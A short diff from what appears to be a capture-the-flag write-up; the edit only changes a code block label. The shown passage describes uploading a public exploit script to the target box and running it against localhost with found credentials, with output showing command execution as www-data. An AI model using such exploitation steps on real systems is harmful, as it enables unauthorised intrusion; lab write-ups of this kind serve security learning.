@@ -366,7 +366,7 @@ Shellcodes: No Results
 ```
 
 Because this port isn't exposed externally, we'll have to either set up a reverse tunnel or attack locally on the box. For simplicity, we upload the exploit file and run it against localhost with the credentials that we found in ada's python file earlier. 
-```bash
+```console
 ada@forgottenimplant:~$ python3 ./50457.py 127.0.0.1 80 / app [redacted] id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
